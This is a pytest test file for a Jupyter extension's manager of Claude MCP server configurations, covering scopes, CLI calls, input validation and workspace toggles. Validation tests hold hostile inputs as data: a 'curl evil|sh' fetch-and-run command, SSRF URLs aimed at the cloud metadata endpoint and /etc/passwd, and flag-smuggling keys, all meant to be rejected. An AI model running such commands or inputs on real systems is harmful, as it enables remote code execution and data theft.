# Copyright (c) Mehmet Bektas <mbektasgh@outlook.com>

"""Tests for the ClaudeMCPManager and the management policy gate."""

import asyncio
import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from tornado.testing import AsyncHTTPTestCase

import notebook_intelligence.extension as ext_module
from notebook_intelligence.claude_mcp_manager import (
    ClaudeMCPManager,
    ClaudeMCPServer,
)
from notebook_intelligence.extension import (
    ClaudeMCPBaseHandler,
    ClaudeMCPDetailHandler,
    ClaudeMCPListHandler,
)


@pytest.fixture
def claude_home(tmp_path, monkeypatch):
    """Stand up a fake $HOME with a populated `~/.claude.json`."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
    return home


@pytest.fixture
def working_dir(tmp_path):
    cwd = tmp_path / "project"
    cwd.mkdir()
    return cwd


def _write_claude_json(home: Path, doc: dict) -> None:
    (home / ".claude.json").write_text(json.dumps(doc), encoding="utf-8")


class TestClaudeMCPManagerListServers:
    def test_empty_when_no_config(self, claude_home, working_dir):
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        assert manager.list_servers() == []

    def test_user_scope_servers_round_trip(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {
                "mcpServers": {
                    "voicemode": {
                        "type": "stdio",
                        "command": "uvx",
                        "args": ["--refresh", "voice-mode"],
                        "env": {},
                    },
                    "sentry": {
                        "type": "http",
                        "url": "https://mcp.sentry.dev/mcp",
                        "headers": {"X-Tenant": "acme"},
                    },
                }
            },
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        servers = manager.list_servers()
        names = [(s.name, s.scope, s.transport) for s in servers]
        assert names == [
            ("sentry", "user", "http"),
            ("voicemode", "user", "stdio"),
        ]
        sentry = next(s for s in servers if s.name == "sentry")
        assert sentry.url == "https://mcp.sentry.dev/mcp"
        assert sentry.headers == {"X-Tenant": "acme"}
        voicemode = next(s for s in servers if s.name == "voicemode")
        assert voicemode.command == "uvx"
        assert voicemode.args == ["--refresh", "voice-mode"]

    def test_local_scope_keyed_by_working_dir(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {
                "projects": {
                    str(working_dir): {
                        "mcpServers": {
                            "playwright": {
                                "type": "stdio",
                                "command": "npx",
                                "args": ["-y", "@playwright/mcp@latest"],
                            }
                        }
                    },
                    "/some/other/project": {
                        "mcpServers": {
                            "should-not-appear": {
                                "type": "stdio",
                                "command": "x",
                            }
                        }
                    },
                }
            },
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        servers = manager.list_servers()
        assert [(s.name, s.scope) for s in servers] == [("playwright", "local")]

    def test_project_scope_from_dot_mcp_json(self, claude_home, working_dir):
        (working_dir / ".mcp.json").write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "shared": {
                            "type": "stdio",
                            "command": "shared-cmd",
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        servers = manager.list_servers()
        assert [(s.name, s.scope) for s in servers] == [("shared", "project")]

    def test_all_three_scopes_merged(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {
                "mcpServers": {
                    "u-srv": {"type": "stdio", "command": "u"},
                },
                "projects": {
                    str(working_dir): {
                        "mcpServers": {
                            "l-srv": {"type": "stdio", "command": "l"},
                        }
                    }
                },
            },
        )
        (working_dir / ".mcp.json").write_text(
            json.dumps({"mcpServers": {"p-srv": {"type": "stdio", "command": "p"}}}),
            encoding="utf-8",
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        scopes = {s.name: s.scope for s in manager.list_servers()}
        assert scopes == {"u-srv": "user", "l-srv": "local", "p-srv": "project"}

    def test_unknown_transport_passes_through(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {"mcpServers": {"weird": {"type": "websocket", "url": "wss://x"}}},
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        srv = manager.list_servers()[0]
        assert srv.transport == "websocket"


class TestClaudeMCPManagerWrites:
    def test_add_returns_canonical_record_when_post_read_succeeds(
        self, claude_home, working_dir, monkeypatch
    ):
        """When the post-add re-read finds the freshly-written server, the
        canonical record (parsed from disk) is returned — *not* the
        synthesized fallback. This pins the preference: a regression that
        always synthesized would silently lose any field-level rewriting
        Claude does (e.g. inferring transport from the URL)."""
        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )

        async def fake_subprocess(*argv, **kwargs):
            # Simulate Claude actually writing the server to ~/.claude.json.
            doc = {
                "mcpServers": {
                    "my-srv": {
                        "type": "stdio",
                        "command": "claude-rewrote-this",
                        "args": ["--from", "claude"],
                        "env": {"CLAUDE": "added"},
                    }
                }
            }
            (claude_home / ".claude.json").write_text(json.dumps(doc))
            proc = MagicMock()

            async def communicate():
                return (b"", b"")

            proc.communicate = communicate
            proc.returncode = 0
            return proc

        monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_subprocess)
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        result = asyncio.run(
            manager.add_server(
                name="my-srv",
                scope="user",
                transport="stdio",
                command_or_url="user-supplied-cmd",
                args=["--user-arg"],
            )
        )
        # Canonical fields from disk, not synthesized from inputs.
        assert result.command == "claude-rewrote-this"
        assert result.args == ["--from", "claude"]
        assert result.env == {"CLAUDE": "added"}

    @pytest.mark.parametrize("scope", ["user", "project", "local"])
    def test_add_invokes_cli_with_correct_args(
        self, claude_home, working_dir, scope, monkeypatch
    ):
        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )
        captured: dict = {}

        async def fake_subprocess(*argv, **kwargs):
            captured["argv"] = list(argv)
            captured["cwd"] = kwargs.get("cwd")
            proc = MagicMock()

            async def communicate():
                return (b"ok", b"")

            proc.communicate = communicate
            proc.returncode = 0
            return proc

        monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_subprocess)

        # The post-add re-read should find the server too.
        _write_claude_json(claude_home, {"mcpServers": {}})
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        result = asyncio.run(
            manager.add_server(
                name="my-srv",
                scope=scope,
                transport="stdio",
                command_or_url="npx",
                args=["-y", "pkg"],
                env={"K": "v"},
            )
        )
        assert captured["argv"][0] == "/usr/local/bin/claude"
        assert "mcp" in captured["argv"]
        assert "add" in captured["argv"]
        assert "--scope" in captured["argv"]
        scope_idx = captured["argv"].index("--scope")
        assert captured["argv"][scope_idx + 1] == scope
        assert "-e" in captured["argv"]
        assert "K=v" in captured["argv"]
        assert captured["argv"][-3:] == ["npx", "--", "-y"] or captured["argv"][
            -4:
        ] == ["npx", "--", "-y", "pkg"]
        # When the CLI succeeds but our re-read finds nothing, we synthesize
        # from the inputs rather than 500.
        assert result.name == "my-srv"
        assert result.scope == scope

    @pytest.mark.parametrize(
        "env_key",
        ["-flag", "--inject", "BAD=KEY"],
    )
    def test_add_rejects_env_key_that_could_smuggle_flag(
        self, claude_home, working_dir, env_key
    ):
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        with pytest.raises(ValueError, match="env key"):
            asyncio.run(
                manager.add_server(
                    name="s",
                    scope="user",
                    transport="stdio",
                    command_or_url="npx",
                    env={env_key: "v"},
                )
            )

    @pytest.mark.parametrize(
        "header_key",
        ["-flag", "--inject", "Bad:Name"],
    )
    def test_add_rejects_header_name_that_could_smuggle_flag(
        self, claude_home, working_dir, header_key
    ):
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        with pytest.raises(ValueError, match="header name"):
            asyncio.run(
                manager.add_server(
                    name="s",
                    scope="user",
                    transport="http",
                    command_or_url="https://example.com",
                    headers={header_key: "v"},
                )
            )

    @pytest.mark.parametrize("transport", ["sse", "http"])
    @pytest.mark.parametrize(
        "bad_url",
        [
            "http://example.com",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "ftp://example.com",
        ],
    )
    def test_add_rejects_non_https_network_transport(
        self, claude_home, working_dir, transport, bad_url
    ):
        # SSRF defense: sse/http transports must be https only.
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        with pytest.raises(ValueError, match="https"):
            asyncio.run(
                manager.add_server(
                    name="s",
                    scope="user",
                    transport=transport,
                    command_or_url=bad_url,
                )
            )

    def test_remove_invokes_cli(self, claude_home, working_dir, monkeypatch):
        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )
        captured: dict = {}

        async def fake_subprocess(*argv, **kwargs):
            captured["argv"] = list(argv)
            proc = MagicMock()

            async def communicate():
                return (b"", b"")

            proc.communicate = communicate
            proc.returncode = 0
            return proc

        monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_subprocess)

        manager = ClaudeMCPManager(working_dir=str(working_dir))
        asyncio.run(manager.remove_server("my-srv", "user"))
        assert captured["argv"][1:] == [
            "mcp",
            "remove",
            "--scope",
            "user",
            "my-srv",
        ]

    def test_cli_failure_raises_with_stderr(
        self, claude_home, working_dir, monkeypatch
    ):
        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )

        async def fake_subprocess(*argv, **kwargs):
            proc = MagicMock()

            async def communicate():
                return (b"", b"already exists")

            proc.communicate = communicate
            proc.returncode = 1
            return proc

        monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_subprocess)

        manager = ClaudeMCPManager(working_dir=str(working_dir))
        with pytest.raises(ValueError, match="already exists"):
            asyncio.run(manager.remove_server("name", "user"))

    def test_missing_cli_raises_filenotfound(
        self, claude_home, working_dir, monkeypatch
    ):
        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: None,
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        with pytest.raises(FileNotFoundError):
            asyncio.run(manager.remove_server("name", "user"))

    def test_leading_dash_name_rejected(self, claude_home, working_dir, monkeypatch):
        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        with pytest.raises(ValueError, match="leading '-'"):
            asyncio.run(
                manager.add_server(
                    name="--scope=user",
                    scope="user",
                    transport="stdio",
                    command_or_url="x",
                )
            )

    def test_leading_dash_command_rejected(
        self, claude_home, working_dir, monkeypatch
    ):
        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        with pytest.raises(ValueError, match="leading '-'"):
            asyncio.run(
                manager.add_server(
                    name="srv",
                    scope="user",
                    transport="stdio",
                    command_or_url="--whatever",
                )
            )

    def test_stdio_command_rejected_by_admin_allowlist(
        self, claude_home, working_dir, monkeypatch
    ):
        # When the admin pins a strict allowlist, a shell-style payload
        # cannot reach the CLI fork: the validator raises before the
        # subprocess is invoked at all. The Claude CLI never sees the bad
        # command.
        called = []

        async def fake_subprocess(*argv, **kwargs):
            called.append(argv)
            raise AssertionError("subprocess should not run when allowlist rejects")

        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )
        monkeypatch.setattr(
            "asyncio.create_subprocess_exec", fake_subprocess
        )
        manager = ClaudeMCPManager(
            working_dir=str(working_dir),
            stdio_command_allowlist=["^uv$", "^uvx$", "^npx$"],
        )
        with pytest.raises(ValueError, match="not in the admin allowlist"):
            asyncio.run(
                manager.add_server(
                    name="evil",
                    scope="user",
                    transport="stdio",
                    command_or_url="sh",
                    args=["-c", "curl evil|sh"],
                )
            )
        assert called == []

    def test_stdio_command_accepted_when_matches_allowlist(
        self, claude_home, working_dir, monkeypatch
    ):
        async def fake_subprocess(*argv, **kwargs):
            class _Proc:
                returncode = 0

                async def communicate(self):
                    return (b"", b"")

            return _Proc()

        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )
        monkeypatch.setattr(
            "asyncio.create_subprocess_exec", fake_subprocess
        )
        manager = ClaudeMCPManager(
            working_dir=str(working_dir),
            stdio_command_allowlist=["^uv$", "^uvx$"],
        )
        # No exception: the CLI is invoked. The synthesized record is
        # returned because the post-add read finds no matching entry in
        # the fake home (we did not stub ~/.claude.json).
        result = asyncio.run(
            manager.add_server(
                name="good",
                scope="user",
                transport="stdio",
                command_or_url="uv",
            )
        )
        assert result.name == "good"

    def test_url_transports_not_subject_to_stdio_allowlist(
        self, claude_home, working_dir, monkeypatch
    ):
        # The allowlist gates stdio fork only. SSE/HTTP transports go
        # through their own https-required scheme check and the
        # marketplace URL allowlist (separate concern).
        async def fake_subprocess(*argv, **kwargs):
            class _Proc:
                returncode = 0

                async def communicate(self):
                    return (b"", b"")

            return _Proc()

        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )
        monkeypatch.setattr(
            "asyncio.create_subprocess_exec", fake_subprocess
        )
        manager = ClaudeMCPManager(
            working_dir=str(working_dir),
            stdio_command_allowlist=["^never-match$"],
        )
        result = asyncio.run(
            manager.add_server(
                name="sentry",
                scope="user",
                transport="http",
                command_or_url="https://mcp.sentry.dev/mcp",
            )
        )
        assert result.name == "sentry"


class TestRedactArgvForLog:
    def test_redacts_env_values(self):
        from notebook_intelligence._claude_cli import redact_argv_for_log as _redact_argv_for_log

        argv = ["claude", "mcp", "add", "-e", "API_KEY=sk-secret", "name", "cmd"]
        assert _redact_argv_for_log(argv) == [
            "claude",
            "mcp",
            "add",
            "-e",
            "<redacted>",
            "name",
            "cmd",
        ]

    def test_redacts_header_values(self):
        from notebook_intelligence._claude_cli import redact_argv_for_log as _redact_argv_for_log

        argv = ["claude", "mcp", "add", "-H", "Authorization: Bearer abc"]
        assert _redact_argv_for_log(argv)[-2:] == ["-H", "<redacted>"]

    def test_passes_through_non_secrets(self):
        from notebook_intelligence._claude_cli import redact_argv_for_log as _redact_argv_for_log

        argv = ["claude", "mcp", "add", "--scope", "user", "name", "npx"]
        assert _redact_argv_for_log(argv) == argv


class TestLockSerialization:
    """Two concurrent writes against the (process-shared) lock must not
    interleave at the subprocess layer."""

    def test_concurrent_add_server_calls_are_serialized(
        self, claude_home, working_dir, monkeypatch
    ):
        monkeypatch.setattr(
            "notebook_intelligence._claude_cli.resolve_claude_cli_path",
            lambda: "/usr/local/bin/claude",
        )
        events: list[str] = []

        async def fake_subprocess(*argv, **kwargs):
            proc = MagicMock()
            # `claude mcp add ... <name> <commandOrUrl>` — name is second-to-last.
            tag = argv[-2]

            async def communicate():
                events.append(f"start:{tag}")
                await asyncio.sleep(0.01)
                events.append(f"end:{tag}")
                return (b"", b"")

            proc.communicate = communicate
            proc.returncode = 0
            return proc

        monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_subprocess)

        async def driver():
            m1 = ClaudeMCPManager(working_dir=str(working_dir))
            m2 = ClaudeMCPManager(working_dir=str(working_dir))
            await asyncio.gather(
                m1.add_server(name="A", scope="user", transport="stdio", command_or_url="x"),
                m2.add_server(name="B", scope="user", transport="stdio", command_or_url="y"),
            )

        asyncio.run(driver())
        assert len(events) == 4
        assert events[0].startswith("start:")
        assert events[1] == events[0].replace("start:", "end:")
        assert events[2].startswith("start:")
        assert events[3] == events[2].replace("start:", "end:")


# Per-family policy-gate coverage lives in `tests/test_policy_gate.py`,
# parametrized across SkillsBaseHandler / ClaudeMCPBaseHandler /
# PluginsBaseHandler.


class TestWorkspaceDisable:
    """`projects.<cwd>.disabledMcpServers[]` round-trips on read/write."""

    def test_disabled_flag_surfaces_on_list(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {
                "mcpServers": {
                    "voicemode": {"type": "stdio", "command": "uvx"},
                    "sentry": {"type": "http", "url": "https://example.com/mcp"},
                },
                "projects": {
                    str(working_dir): {"disabledMcpServers": ["voicemode"]},
                },
            },
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        servers = {s.name: s for s in manager.list_servers()}
        assert servers["voicemode"].disabled_for_workspace is True
        assert servers["sentry"].disabled_for_workspace is False

    def test_disabled_flag_scoped_to_cwd(self, claude_home, tmp_path):
        cwd_a = tmp_path / "a"
        cwd_a.mkdir()
        cwd_b = tmp_path / "b"
        cwd_b.mkdir()
        _write_claude_json(
            claude_home,
            {
                "mcpServers": {"voicemode": {"type": "stdio", "command": "uvx"}},
                "projects": {
                    str(cwd_a): {"disabledMcpServers": ["voicemode"]},
                    str(cwd_b): {"disabledMcpServers": []},
                },
            },
        )
        manager_a = ClaudeMCPManager(working_dir=str(cwd_a))
        manager_b = ClaudeMCPManager(working_dir=str(cwd_b))
        assert manager_a.list_servers()[0].disabled_for_workspace is True
        assert manager_b.list_servers()[0].disabled_for_workspace is False

    def test_disable_writes_to_user_config(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {
                "mcpServers": {"voicemode": {"type": "stdio", "command": "uvx"}},
                "projects": {str(working_dir): {"otherKey": "preserved"}},
            },
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        srv = asyncio.run(manager.set_server_disabled("voicemode", True))
        assert srv.disabled_for_workspace is True

        with (claude_home / ".claude.json").open() as fp:
            doc = json.load(fp)
        project_block = doc["projects"][str(working_dir)]
        assert project_block["disabledMcpServers"] == ["voicemode"]
        # Sibling keys must not be clobbered when we touch a project block.
        assert project_block["otherKey"] == "preserved"

    def test_enable_removes_from_disabled_list(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {
                "mcpServers": {
                    "voicemode": {"type": "stdio", "command": "uvx"},
                    "other": {"type": "stdio", "command": "x"},
                },
                "projects": {
                    str(working_dir): {
                        "disabledMcpServers": ["voicemode", "other"]
                    }
                },
            },
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        srv = asyncio.run(manager.set_server_disabled("voicemode", False))
        assert srv.disabled_for_workspace is False
        with (claude_home / ".claude.json").open() as fp:
            doc = json.load(fp)
        assert doc["projects"][str(working_dir)]["disabledMcpServers"] == [
            "other"
        ]

    def test_disable_idempotent(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {
                "mcpServers": {"voicemode": {"type": "stdio", "command": "uvx"}},
                "projects": {
                    str(working_dir): {"disabledMcpServers": ["voicemode"]}
                },
            },
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        asyncio.run(manager.set_server_disabled("voicemode", True))
        with (claude_home / ".claude.json").open() as fp:
            doc = json.load(fp)
        assert doc["projects"][str(working_dir)]["disabledMcpServers"] == [
            "voicemode"
        ]

    def test_disable_creates_missing_project_block(self, claude_home, working_dir):
        _write_claude_json(
            claude_home,
            {"mcpServers": {"voicemode": {"type": "stdio", "command": "uvx"}}},
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        asyncio.run(manager.set_server_disabled("voicemode", True))
        with (claude_home / ".claude.json").open() as fp:
            doc = json.load(fp)
        assert doc["projects"][str(working_dir)]["disabledMcpServers"] == [
            "voicemode"
        ]

    def test_disable_creates_missing_config_file(self, claude_home, working_dir):
        path = claude_home / ".claude.json"
        assert not path.exists()
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        # Toggling disabled for a server that doesn't yet exist is allowed; the
        # flag would apply if/when the server is added. The user sees a
        # synthesized record because there's no canonical definition to read.
        srv = asyncio.run(manager.set_server_disabled("future-server", True))
        assert srv.disabled_for_workspace is True
        assert path.exists()
        with path.open() as fp:
            doc = json.load(fp)
        assert doc["projects"][str(working_dir)]["disabledMcpServers"] == [
            "future-server"
        ]

    def test_disable_rejects_corrupt_config(self, claude_home, working_dir):
        (claude_home / ".claude.json").write_text("{not json", encoding="utf-8")
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        with pytest.raises(ValueError, match="parse"):
            asyncio.run(manager.set_server_disabled("voicemode", True))

    def test_disable_atomic_write_preserves_other_top_level_keys(
        self, claude_home, working_dir
    ):
        _write_claude_json(
            claude_home,
            {
                "mcpServers": {"voicemode": {"type": "stdio", "command": "uvx"}},
                "telemetry": {"feedbackSurveyState": "completed"},
                "projects": {},
            },
        )
        manager = ClaudeMCPManager(working_dir=str(working_dir))
        asyncio.run(manager.set_server_disabled("voicemode", True))
        with (claude_home / ".claude.json").open() as fp:
            doc = json.load(fp)
        # Unrelated top-level fields must survive a partial-update write.
        assert doc["telemetry"] == {"feedbackSurveyState": "completed"}
        assert doc["mcpServers"]["voicemode"]["command"] == "uvx"


class TestPatchEndpointDispatches(AsyncHTTPTestCase):
    """End-to-end dispatch test for the PATCH handler.

    Earlier handler-method unit tests passed even though the production
    code raised ``NameError`` on its first import-miss (``validate_scope``
    was used without being imported in ``extension.py``). This suite drives
    the real tornado handler so any missing import or wiring bug fails
    here instead of in the user's browser.
    """

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        from jupyter_server.base.handlers import APIHandler

        async def _noop(_self):
            return None

        cls._api_handler_patcher = patch.object(APIHandler, "prepare", _noop)
        cls._api_handler_patcher.start()
        # The @tornado.web.authenticated decorator calls self.current_user;
        # jupyter_server's APIHandler defines current_user as a property
        # backed by get_current_user(). Stub it to a truthy value so the
        # decorator passes without setting up cookie_secret + identity.
        cls._current_user_patcher = patch.object(
            APIHandler,
            "current_user",
            property(lambda _self: {"name": "test-user"}),
        )
        cls._current_user_patcher.start()

    @classmethod
    def tearDownClass(cls):
        cls._current_user_patcher.stop()
        cls._api_handler_patcher.stop()
        super().tearDownClass()

    def setUp(self):
        # `setUp` runs once per test; we need a fresh fake `$HOME` and cwd
        # for every dispatch so write side-effects don't leak.
        super().setUp()
        import tempfile

        self._home = Path(tempfile.mkdtemp(prefix="patch_home_"))
        self._cwd = Path(tempfile.mkdtemp(prefix="patch_cwd_"))
        (self._home / ".claude.json").write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "voicemode": {"type": "stdio", "command": "uvx"}
                    }
                }
            ),
            encoding="utf-8",
        )
        self._home_patcher = patch.object(
            Path, "home", classmethod(lambda cls: self._home)
        )
        self._home_patcher.start()
        self._cwd_patcher = patch.object(
            ext_module, "get_jupyter_root_dir", lambda: str(self._cwd)
        )
        self._cwd_patcher.start()

    def tearDown(self):
        self._home_patcher.stop()
        self._cwd_patcher.stop()
        import shutil

        shutil.rmtree(self._home, ignore_errors=True)
        shutil.rmtree(self._cwd, ignore_errors=True)
        super().tearDown()

    def get_app(self):
        from tornado.web import Application

        return Application(
            [
                (
                    r"/claude-mcp/(user|project|local)/([^/]+)",
                    ClaudeMCPDetailHandler,
                ),
            ]
        )

    def _fetch_patch(self, path, body):
        return self.fetch(
            path,
            method="PATCH",
            body=json.dumps(body),
            headers={"Content-Type": "application/json"},
            allow_nonstandard_methods=True,
        )

    def test_patch_toggles_disabled_for_workspace(self):
        # The actual dispatch path: a NameError on `validate_scope` would
        # surface here as 500.
        response = self._fetch_patch(
            "/claude-mcp/user/voicemode",
            {"disabled_for_workspace": True},
        )
        assert response.code == 200, response.body
        body = json.loads(response.body)
        assert body["server"]["disabled_for_workspace"] is True
        # The on-disk state must reflect the toggle.
        with (self._home / ".claude.json").open() as fp:
            doc = json.load(fp)
        assert doc["projects"][str(self._cwd)]["disabledMcpServers"] == [
            "voicemode"
        ]

    def test_patch_rejects_non_bool_payload(self):
        response = self._fetch_patch(
            "/claude-mcp/user/voicemode",
            {"disabled_for_workspace": "false"},
        )
        assert response.code == 400
        assert b"must be a JSON boolean" in response.body

    def test_patch_rejects_missing_field(self):
        response = self._fetch_patch("/claude-mcp/user/voicemode", {})
        assert response.code == 400
        assert b"Missing" in response.body
